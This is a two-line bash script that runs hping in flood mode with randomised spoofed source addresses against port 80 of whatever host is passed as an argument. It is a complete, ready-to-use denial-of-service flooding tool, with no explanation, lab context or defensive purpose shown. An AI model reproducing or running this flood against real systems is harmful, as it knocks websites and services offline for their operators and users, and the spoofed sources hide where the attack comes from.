#!/bin/bash
hping  -V --flood --rand-source -p 80 $@
